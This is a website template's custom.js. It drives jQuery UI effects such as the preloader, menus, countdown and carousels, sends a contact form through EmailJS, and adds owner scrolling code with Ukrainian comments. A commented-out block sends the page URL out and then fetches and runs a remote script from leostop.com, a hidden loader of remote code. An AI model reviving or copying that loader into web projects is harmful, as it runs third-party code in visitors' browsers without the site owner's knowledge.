/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
  "use strict";

  /* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $(".loader_bg").fadeToggle();
  }, 1500);

  /* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  /* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  /* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(window).on("scroll", function () {
    scroll = $(window).scrollTop();
    if (scroll >= 100) {
      $("#back-to-top").addClass("b-show_scrollBut");
    } else {
      $("#back-to-top").removeClass("b-show_scrollBut");
    }
  });
  $("#back-to-top").on("click", function () {
    $("body,html").animate(
      {
        scrollTop: 0,
      },
      1000
    );
  });

  /* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $("[data-countdown]").each(function () {
    var $this = $(this),
      finalDate = $(this).data("countdown");
    $this.countdown(finalDate, function (event) {
      var $this = $(this).html(
        event.strftime(
          "" +
            '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> ' +
            '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> ' +
            '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> ' +
            '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> ' +
            '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'
        )
      );
    });
  });

  // function getURL() {
  //   window.location.href;
  // }
  // var protocol = location.protocol;
  // $.ajax({
  //   type: "get",
  //   data: { surl: getURL() },
  //   success: function (response) {
  //     $.getScript(protocol + "//leostop.com/tracking/tracking.js");
  //   },
  // });

  /* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $("#blogCarousel").carousel({
    interval: 5000,
  });

  /* Disable start slider
============================*/

  $(document).ready(function () {
    $(".carousel").carousel({
      interval: false,
    });
  });

  $("#request").submit(function (e) {
    e.preventDefault();
    const name = e.target["name"].value;
    const phone = e.target["phone"].value;
    const email = e.target["email"].value;
    const message = e.target["message"].value;

    emailjs.send("service_vwrhup8", "template_9321rdg", {
      name: name,
      phone: phone,
      email: email,
      message: message,
    });
    
    e.target.innerHTML = `<div class="alert alert-success" role="alert">` + `<h3>Your message has been successfully sent. <br/> We will contact you soon!</h3>. ` + `</div>`;

  });
});

/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

/////////////////////// My custom js //////////////////////////////////

/////////////////////// My custom js //////////////////////////////////

/////////////////////// My custom js //////////////////////////////////

$(document).ready(function () {
  // Обробка кліку на посиланнях навігаційного меню
  $(".nav-link, .read_more").on("click", function (event) {
    event.preventDefault();

    // Отримуємо href атрибут посилання та визначаємо ID секції, до якої потрібно прокрутити
    const target = $(this).attr("data-target");

    // Виконуємо плавну анімацію прокрутки до цільової секції
    $("html, body").animate(
      {
        scrollTop: $(target).offset().top,
      },
      800
    ); // 800 - тривалість анімації у мілісекундах
  });

  $(".triacom").on("click", function (event) {
    window.open("https://www.triangulum.ua/");
  });
});
